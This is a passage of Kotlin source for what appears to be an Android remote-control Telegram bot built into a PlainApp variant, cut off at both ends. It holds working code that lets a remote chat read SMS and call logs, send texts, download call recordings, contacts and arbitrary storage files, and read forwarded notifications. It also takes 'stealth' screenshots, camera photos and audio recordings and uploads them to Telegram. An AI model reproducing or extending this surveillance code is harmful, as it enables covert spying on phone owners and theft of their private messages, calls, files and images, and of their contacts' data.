            // Slice client-side so paging is reliable even when the SMS provider
            // refuses LIMIT/OFFSET in the sort clause on Android 11+.
            val fetchCap = offset + pageSize + 1
            val all = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📭 No messages in thread $threadId" else "📭 No more messages."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📨 <b>Thread $threadId</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            // Show oldest-first within the page so threading reads naturally.
            pageItems.reversed().forEach { m ->
                val dir = if (m.type == 1) "📥" else "📤"
                sb.append("$dir <b>${htmlEsc(m.address.ifBlank { "(unknown)" })}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
                sb.append("   ${htmlEsc(m.body.take(300))}\n\n")
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "sms_pg:$threadId:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "sms_pg:$threadId:${offset + pageSize}")
            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read thread: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun cmdSendSms(args: List<String>) {
        if (args.size < 2) { sendMessage("Usage: /sendsms <number> <message text>"); return }
        val number = args[0]
        val text = args.drop(1).joinToString(" ")
        try {
            SmsHelper.sendText(number, text)
            sendMessage("✅ SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(text)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdCalls(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastCallsQuery = query
        renderCallsPage(query, offset = 0, editMessageId = null)
    }

    private suspend fun renderCallsPage(query: String, offset: Int, editMessageId: Long?) {
        lastCallsQuery = query
        try {
            val pageSize = 10
            // CallLog provider ignores QUERY_ARG_OFFSET on most devices, so the same
            // first page would otherwise repeat. Slice client-side for reliable paging.
            val fetchCap = offset + pageSize + 1
            val all = CallMediaStoreHelper.searchAsync(MainApp.instance, query, fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📞 No call log entries." else "📞 No more entries."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val queryLabel = if (query.isNotEmpty()) " · search: <i>${htmlEsc(query)}</i>" else ""
            val sb = StringBuilder("📞 <b>Recent Calls</b>$queryLabel · Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a number's row below to call, text, or save it.</i>\n\n")

            // Track which numbers we've already issued a button row for, so a number
            // that appears multiple times in the page doesn't duplicate buttons.
            // Map number -> the index in the visible list (1-based) so the button
            // label can reference the call entry the user is acting on.
            val seenNumbers = LinkedHashMap<String, Pair<Int, Boolean>>() // num -> (index, knownContact)

            pageItems.forEachIndexed { i, c ->
                val typeEmoji = when (c.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞 Unknown"
                }
                val dur = if (c.duration > 0) " · ${c.duration}s" else ""
                // Resolve name: use cached name from CallLog, fall back to live ContactsContract lookup
                val resolvedName = c.name.ifBlank { lookupContactName(c.number) }
                val rowIndex = offset + i + 1
                sb.append("${rowIndex}. $typeEmoji${dur}\n")
                if (resolvedName.isNotBlank()) {
                    sb.append("   👤 <b>${htmlEsc(resolvedName)}</b>\n")
                }
                sb.append("   📱 <code>${htmlEsc(c.number)}</code>\n")
                sb.append("   🕐 ${fmtTime(c.startedAt.toEpochMilliseconds())}\n\n")

                if (c.number.isNotBlank() && !seenNumbers.containsKey(c.number)) {
                    seenNumbers[c.number] = rowIndex to resolvedName.isNotBlank()
                }
            }

            val rows = mutableListOf<List<Pair<String, String>>>()

            // One Call / SMS / (Save|Open) row per unique number on the page.
            // Cap at 8 to keep the inline keyboard usable on phones.
            seenNumbers.entries.take(8).forEach { (num, meta) ->
                val (rowIndex, isKnown) = meta
                val tok = phoneToken(num)
                val short = num.take(16)
                val thirdLabel = if (isKnown) "👤 Open" else "💾 Save"
                val thirdData = if (isKnown) "cl_open:$tok" else "nf_save:$tok"
                rows.add(listOf(
                    "${rowIndex}. 📞 $short" to "nf_call:$tok",
                    "💬 SMS" to "nf_sms:$tok",
                    thirdLabel to thirdData,
                ))
            }

            val q = if (query.isEmpty()) "_" else query
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "calls_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "calls_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search calls" to "calls_q", "🔄 Refresh" to "calls_pg:_:0"))

            val markup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read call log: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    @Volatile private var lastRecQuery: String = ""

    private suspend fun cmdRecordings(args: List<String>) {
        sendTyping()
        val query = args.joinToString(" ").trim()
        renderRecordingsPage(query, 0, editMessageId = null)
    }

    private suspend fun renderRecordingsPage(query: String, offset: Int, editMessageId: Long?) {
        lastRecQuery = query
        try {
            val all = CallRecorderHelper.list()
            // Filter by query: match against displayName (phone number), source app, or resolved contact name
            val filtered = if (query.isEmpty()) all else {
                val q = query.lowercase()
                all.filter { m ->
                    m.displayName.lowercase().contains(q) ||
                    m.source.lowercase().contains(q) ||
                    lookupContactName(m.displayName).lowercase().contains(q)
                }
            }
            if (filtered.isEmpty()) {
                val msg = if (query.isEmpty()) "🎙️ No call recordings found. Enable call recording in PlainApp settings."
                          else "🎙️ No recordings match \"${htmlEsc(query)}\"."
                val rows = mutableListOf<List<Pair<String, String>>>()
                rows.add(listOf("🔍 Search" to "rec_q", "🔄 Refresh" to "rec_pg:_:0"))
                val markup = TelegramApiClient.inlineKeyboard(rows)
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg, replyMarkup = markup)
                else sendMessage(msg, replyMarkup = markup)
                return
            }
            val pageSize = 8
            val window = filtered.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            val queryLabel = if (query.isNotEmpty()) " · 🔍 <i>${htmlEsc(query)}</i>" else ""
            val sb = StringBuilder("🎙️ <b>Call Recordings</b>$queryLabel\n")
            sb.append("Showing ${offset + 1}–${offset + pageItems.size} of ${filtered.size}\n")
            sb.append("<i>Tap a button below to download that recording.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, m ->
                val dirEmoji = if (m.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(m.durationMs)
                // m.displayName holds the phone number; look it up in contacts to get the real name
                val contactName = lookupContactName(m.displayName)
                val nameDisplay = contactName.ifBlank { m.displayName }
                val rowIndex = offset + i + 1
                sb.append("${rowIndex}. $dirEmoji")
                if (contactName.isNotBlank()) {
                    sb.append(" <b>${htmlEsc(contactName)}</b>")
                    if (m.displayName.isNotBlank()) sb.append("\n   📱 <code>${htmlEsc(m.displayName)}</code>")
                } else if (m.displayName.isNotBlank()) {
                    sb.append(" <b>${htmlEsc(m.displayName)}</b>")
                }
                sb.append("\n   ⏱ $dur  ·  📦 ${m.sizeBytes / 1024} KB")
                sb.append("\n   🕐 ${fmtTime(m.startedAt)}")
                if (m.source != "unknown") sb.append("  ·  <i>${htmlEsc(m.source.ifBlank { m.appName })}</i>")
                sb.append("\n\n")
                val tok = recToken(m.filename)
                rows.add(listOf(
                    "📥 ${rowIndex}. ${nameDisplay.take(16)} · $dur" to "rec_get:${m.filename.take(50)}",
                    "🗑 Delete" to "rec_del:$tok",
                ))
            }
            val q = if (query.isEmpty()) "_" else query
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "rec_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "rec_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search" to "rec_q", "🔄 Refresh" to "rec_pg:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read recordings: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    /** Last list state, used so the contact-detail "Back to list" button restores the right page. */
    @Volatile private var lastContactsQuery: String = ""
    @Volatile private var lastContactsOffset: Int = 0
    @Volatile private var lastMessagesQuery: String = ""
    @Volatile private var lastCallsQuery: String = ""
    @Volatile private var lastNotifQuery: String = ""

    private suspend fun cmdContacts(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderContactsPage(query, 0, editMessageId = null)
    }

    private suspend fun renderContactsPage(query: String, offset: Int, editMessageId: Long?) {
        lastContactsQuery = query
        lastContactsOffset = offset
        try {
            val pageSize = 20
            // Android's Contacts provider does not honour QUERY_ARG_OFFSET reliably on
            // Android 11+, so paging with a non-zero offset would just return the same
            // first page over and over. We fetch up to (offset + pageSize + 1) rows from
            // offset 0 and slice client-side, matching the working /files paging pattern.
            val fetchCap = offset + pageSize + 1
            val all = ContactMediaStoreHelper.searchAsync(MainApp.instance, query, fetchCap, 0)
            val window = all.drop(offset).take(pageSize + 1)
            val hasMore = window.size > pageSize
            val pageItems = window.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "👥 No contacts found." else "👥 No more contacts."
                if (editMessageId != null) {
                    TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                } else sendMessage(msg)
                return
            }
            val title = if (query.isEmpty()) "👥 <b>Contacts</b>" else "👥 <b>Contacts</b> · <i>${htmlEsc(query.removePrefix("text:"))}</i>"
            val sb = StringBuilder("$title  ·  Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a contact to call, message, or share.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, c ->
                val display = contactDisplayName(c)
                val firstPhone = c.phoneNumbers.firstOrNull()?.value
                val previewPhone = if (firstPhone != null) "  ·  📞 ${htmlEsc(firstPhone)}" else ""
                sb.append("${offset + i + 1}. 👤 <b>${htmlEsc(display)}</b>$previewPhone\n")
                if (c.organization != null && c.organization!!.company.isNotBlank()) {
                    sb.append("   🏢 ${htmlEsc(c.organization!!.company)}\n")
                }
                // 1-button row per contact = clean modern list
                val q = query.ifEmpty { "_" }
                val btnLabel = "${offset + i + 1}. ${display.take(28)}"
                rows.add(listOf(btnLabel to "c_view:${c.id}:$q:$offset"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val q = query.ifEmpty { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "contacts_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "contacts_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            rows.add(listOf("🔍 Search contacts" to "contacts_q", "🔄 Refresh" to "contacts_pg:_:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) {
                TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            } else {
                sendMessage(sb.toString(), replyMarkup = markup)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not read contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdNotifications(args: List<String>) {
        val queryArg = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastNotifQuery = queryArg
        renderNotificationsPage(queryArg, editMessageId = null)
    }

    private fun renderNotificationsPage(query: String, editMessageId: Long?) {
        lastNotifQuery = query
        val limit = 50
        val all = NotificationLogHelper.all().reversed()
        val filtered = if (query.isEmpty()) all else all.filter { n ->
            n.appName.contains(query, ignoreCase = true) ||
            n.title?.contains(query, ignoreCase = true) == true ||
            n.body?.contains(query, ignoreCase = true) == true
        }
        val list = filtered.take(limit)
        val qLabel = if (query.isNotEmpty()) " · search: <i>${htmlEsc(query)}</i>" else ""
        if (list.isEmpty()) {
            val msg = "🔔 No notifications found$qLabel."
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        val sb = StringBuilder("🔔 <b>Recent Notifications</b>$qLabel (${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. 📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 <b>${htmlEsc(n.title.take(80))}</b>\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(150))}\n")
            sb.append("   🕐 ${fmtTime(n.time.toEpochMilliseconds())}\n\n")
            if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
        }
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("🔍 Search notifications" to "notif_q", "🔄 Refresh" to "notif_refresh"),
        ))
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    /**
     * Toggle the auto-forwarding of incoming Android notifications to this Telegram chat.
     *
     * `/mutenotifs`        — flips the current state
     * `/mutenotifs on`     — silences forwards (notifications still get logged on the device)
     * `/mutenotifs off`    — resumes forwards immediately
     *
     * Only the bot stream is affected — the device keeps logging notifications normally
     * and `/notifications` / `/logs` still work as before.
     */
    private fun cmdMuteNotifs(args: List<String>) {
        val arg = args.firstOrNull()?.lowercase()
        val newMuted = when (arg) {
            "on", "1", "true", "yes", "mute" -> true
            "off", "0", "false", "no", "unmute" -> false
            null, "" -> forwardNotifications  // no arg → flip current state
            else -> {
                sendMessage("❓ Use <code>/mutenotifs on</code> to silence, <code>/mutenotifs off</code> to resume, or <code>/mutenotifs</code> alone to toggle.")
                return
            }
        }
        forwardNotifications = !newMuted
        if (newMuted) {
            sendMessage(
                "🔕 <b>Notification forwarding muted.</b>\n" +
                "I'll stop pushing 🔔 alerts to this chat until you send <code>/mutenotifs off</code>.\n" +
                "<i>Your phone keeps receiving them as usual — only this Telegram stream is paused.</i>",
                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                    listOf("🔔 Resume forwards" to "notif_unmute"),
                ))
            )
        } else {
            sendMessage(
                "🔔 <b>Notification forwarding resumed.</b>\n" +
                "New device notifications will appear here again.",
                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                    listOf("🔕 Mute again" to "notif_mute"),
                ))
            )
        }
    }

    private fun cmdLogs(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 30, 200)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("📋 No notification logs."); return }
        val sb = StringBuilder("📋 <b>Notification Log</b> (last ${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. <b>${htmlEsc(n.appName)}</b> · ${fmtTime(n.time.toEpochMilliseconds())}\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 ${htmlEsc(n.title.take(60))}\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(100))}\n")
            sb.append("\n")
            if (sb.length > 3600) { sb.append("…truncated (${list.size - i - 1} more)"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    /** Stable short-token cache so long paths fit Telegram's 64-byte callback_data limit. */
    /** Holds a one-shot pending-input action keyed for the only authorised chat (single-chat bot). */
    @Volatile private var pendingInput: String? = null

    private val pathTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pathToken(path: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(path.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pathTokens[hex] = path
        return hex
    }
    private fun pathFromToken(token: String): String? = pathTokens[token]

    /** Phone-number tokens — keeps callback_data short and avoids escaping issues with +, spaces, etc. */
    private val phoneTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun phoneToken(num: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(num.toByteArray()).joinToString("") { "%02x".format(it) }.take(10)
        phoneTokens[hex] = num
        return hex
    }
    private fun phoneFromToken(t: String): String? = phoneTokens[t]

    /** Recording-filename tokens — keeps callback_data short (filenames can exceed 64-byte limit). */
    private val recTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun recToken(filename: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(filename.toByteArray()).joinToString("") { "%02x".format(it) }.take(10)
        recTokens[hex] = filename
        return hex
    }
    private fun recFromToken(t: String): String? = recTokens[t]

    /** Look up a contact display name for a given phone number via ContactsContract.PhoneLookup. */
    private fun lookupContactName(number: String): String {
        if (number.isBlank()) return ""
        val uri = android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI
            .buildUpon().appendPath(number).build()
        return try {
            MainApp.instance.contentResolver.query(
                uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) cursor.getString(0) ?: "" else ""
            } ?: ""
        } catch (_: Exception) { "" }
    }

    private fun cmdFiles(args: List<String>) {
        val path = if (args.isNotEmpty()) args.joinToString(" ") else defaultStorageRoot()
        scope.launch { renderFolderPage(path, offset = 0, editMessageId = null) }
    }

    private fun defaultStorageRoot(): String {
        val ext = android.os.Environment.getExternalStorageDirectory()
        return if (ext != null && ext.exists()) ext.absolutePath else "/sdcard"
    }

    private fun renderFolderPage(path: String, offset: Int, editMessageId: Long?) {
        try {
            val dir = File(path)
            if (!dir.exists()) {
                val msg = "❌ Path not found: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            if (!dir.isDirectory) { renderFileView(path, editMessageId); return }
            val items = try {
                dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            } catch (_: SecurityException) { null }
            if (items == null) {
                val msg = "⛔ Permission denied: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }

            val pageSize = 12
            val total = items.size
            val pageItems = items.drop(offset).take(pageSize)
            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b>\n")
            sb.append("<i>${total} items · tap a folder to open, a file to view & download.</i>\n")
            if (total > pageSize) sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, f ->
                val idx = offset + i + 1
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val sizeText = if (f.isFile) "${humanSize(f.length())}" else "${try { f.listFiles()?.size ?: 0 } catch (_: SecurityException) { 0 }} items"
                sb.append("${idx}. $icon <code>${htmlEsc(f.name.take(60))}</code> · $sizeText\n")
                val tok = pathToken(f.absolutePath)
                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
                val label = "$icon ${idx}. ${f.name.take(28)}"
                rows.add(listOf(label to cb))
            }

            // Navigation row(s)
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "files_pg:${pathToken(path)}:${(offset - pageSize).coerceAtLeast(0)}")
            val parent = dir.parentFile?.absolutePath
            if (parent != null && parent != path) nav.add("⬆️ Up" to "files_pg:${pathToken(parent)}:0")
            if (offset + pageSize < total) nav.add("Next ▶️" to "files_pg:${pathToken(path)}:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            // Quick-jump shortcuts when at the default root with empty parent only
            if (offset == 0 && parent == null) {
                rows.add(listOf("🏠 /sdcard" to "files_pg:${pathToken("/sdcard")}:0"))
            }
            rows.add(listOf("🔍 Search files" to "files_q:${pathToken(path)}"))

            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Error: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun renderFileView(path: String, editMessageId: Long?) {
        val f = File(path)
        if (!f.exists()) {
            val msg = "❌ File not found: <code>${htmlEsc(path)}</code>"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        if (f.isDirectory) { renderFolderPage(path, 0, editMessageId); return }
        val parent = f.parentFile?.absolutePath ?: "/"
        val sizeBytes = f.length()
        val sb = StringBuilder()
        sb.append("📄 <b>${htmlEsc(f.name)}</b>\n\n")
        sb.append("📁 <code>${htmlEsc(parent)}</code>\n")
        sb.append("💾 ${humanSize(sizeBytes)}  (${sizeBytes} bytes)\n")
        sb.append("🕐 Modified: ${fmtTime(f.lastModified())}\n")
        sb.append("🔧 Readable: ${if (f.canRead()) "yes" else "no"}\n")
        if (sizeBytes > UPLOAD_LIMIT_BYTES) {
            sb.append("\n⚠️ <i>File is larger than ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB — Telegram bot uploads are capped at this size.</i>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (f.canRead() && sizeBytes <= UPLOAD_LIMIT_BYTES && sizeBytes > 0) {
            rows.add(listOf("📥 Download original" to "file_get:${pathToken(path)}"))
        }
        rows.add(listOf("⬆️ Back to folder" to "files_pg:${pathToken(parent)}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    /** Recursively search for files matching [query] under [root]. Returns up to [max] results. */
    private fun searchFilesRecursive(root: File, query: String, max: Int): List<File> {
        val results = mutableListOf<File>()
        fun walk(dir: File) {
            if (results.size >= max) return
            val entries = try { dir.listFiles() ?: return } catch (_: SecurityException) { return }
            for (f in entries) {
                if (results.size >= max) return
                if (f.name.contains(query, ignoreCase = true)) results.add(f)
                if (f.isDirectory) walk(f)
            }
        }
        walk(root)
        return results
    }

    private fun renderFileSearchResults(rootPath: String, query: String, editMessageId: Long?) {
        try {
            val root = File(rootPath)
            val hits = searchFilesRecursive(root, query, 30)
            val sb = StringBuilder("🔍 <b>File Search</b> · <i>${htmlEsc(query)}</i> in <code>${htmlEsc(rootPath)}</code>\n")
            if (hits.isEmpty()) {
                sb.append("\nNo files found matching <i>${htmlEsc(query)}</i>.")
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString())
                else sendMessage(sb.toString())
                return
            }
            sb.append("Found ${hits.size} result(s) (top 30)\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            hits.forEachIndexed { i, f ->
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val size = if (f.isFile) " · ${humanSize(f.length())}" else ""
                sb.append("${i + 1}. $icon <code>${htmlEsc(f.absolutePath.take(80))}</code>$size\n")
                val tok = pathToken(f.absolutePath)
                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
                rows.add(listOf("$icon ${(i + 1)}. ${f.name.take(28)}" to cb))
            }
            rows.add(listOf("📂 Back to folder" to "files_pg:${pathToken(rootPath)}:0"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Search failed: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private suspend fun cbSendFile(path: String) {
        try {
            val f = File(path)
            if (!f.exists() || !f.isFile) { sendMessage("❌ File no longer exists: <code>${htmlEsc(path)}</code>"); return }
            if (!f.canRead()) { sendMessage("⛔ Not readable: <code>${htmlEsc(path)}</code>"); return }
            if (f.length() > UPLOAD_LIMIT_BYTES) {
                sendMessage("⚠️ File too large for Telegram (${humanSize(f.length())} > ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB).")
                return
            }
            sendUploadDocument()
            val caption = "📄 ${htmlEsc(f.name)} · ${humanSize(f.length())}"
            val ok = TelegramApiClient.sendDocument(token, chatId, f, caption)
            if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Could not send file: ${htmlEsc(e.message ?: "")}")
        }
    }

    /**
     * Render an installed app's launcher icon to a temp PNG and upload it to
     * Telegram with a caption naming the package. Used by the /apps action menu.
     */
    private suspend fun sendAppIcon(pkg: String) {
        try {
            val info = PackageHelper.searchAsync(
                "ids:$pkg", 1, 0,
                com.ismartcoding.plain.features.file.FileSortBy.NAME_ASC,
            ).firstOrNull()
            if (info == null) { sendMessage("❌ App not found: <code>${htmlEsc(pkg)}</code>"); return }
            val bmp = try {
                PackageHelper.getIcon(pkg)
            } catch (e: Exception) {
                sendMessage("❌ No icon available for <code>${htmlEsc(pkg)}</code>: ${htmlEsc(e.message ?: "")}")
                return
            }
            val tmp = File.createTempFile("appicon_", ".png", MainApp.instance.cacheDir)
            tmp.outputStream().use { bmp.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, it) }
            val ok = TelegramApiClient.sendPhoto(token, chatId, tmp, "🖼 ${htmlEsc(info.name)}\n<code>${htmlEsc(pkg)}</code>")
            tmp.delete()
            if (!ok) sendMessage("❌ Failed to upload icon for <code>${htmlEsc(pkg)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Icon error: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun humanSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return "%.1f KB".format(kb)
        val mb = kb / 1024.0
        if (mb < 1024) return "%.1f MB".format(mb)
        return "%.2f GB".format(mb / 1024.0)
    }

    /** Telegram bot API document upload limit. */
    private val UPLOAD_LIMIT_BYTES = 50L * 1024L * 1024L

    private suspend fun cmdScreenshot() {
        sendMessage("📸 Taking screenshot…")
        sendUploadPhoto()
        try {
            val shot = StealthScreenshotCapturer.captureNow(manual = true)
            if (shot == null) {
                sendMessage("❌ Screenshot failed. Ensure Accessibility Service is enabled in PlainApp settings.")
                return
            }
            val file = File(shot.absPath)
            if (!file.exists()) { sendMessage("❌ Screenshot file not found."); return }
            val caption = "📸 Screenshot · ${shot.width}×${shot.height} · ${shot.sizeBytes / 1024} KB · ${ts}"
            TelegramApiClient.sendPhoto(token, chatId, file, caption)
        } catch (e: Exception) {
            sendMessage("❌ Screenshot error: ${htmlEsc(e.message ?: "")}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun cmdPhoto(args: List<String>) {
        val useFront = args.firstOrNull()?.lowercase() == "front"
        sendMessage("📷 Capturing ${if (useFront) "front" else "back"} camera photo…")
        sendUploadPhoto()
        val file = capturePhoto(MainApp.instance, useFront)
        if (file != null) {
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 ${if (useFront) "Front" else "Back"} camera · ${ts}")
            file.delete()
        } else {
            sendMessage("❌ Photo capture failed. Ensure Camera permission is granted.")
        }
    }

    private fun cmdAudio(args: List<String>) {
        // Backwards compat: `/audio 30` immediately starts a 30s recording.
        val direct = args.firstOrNull()?.toIntOrNull()
        if (direct != null) {
            scope.launch { runAudioRecording(direct.coerceIn(1, 300)) }
            return
        }
        showAudioDurationMenu(editMessageId = null)
    }

    private fun showAudioDurationMenu(editMessageId: Long?) {
        val text = "🎙 <b>Record audio</b>\n\nChoose a duration:"
        val rows = listOf(
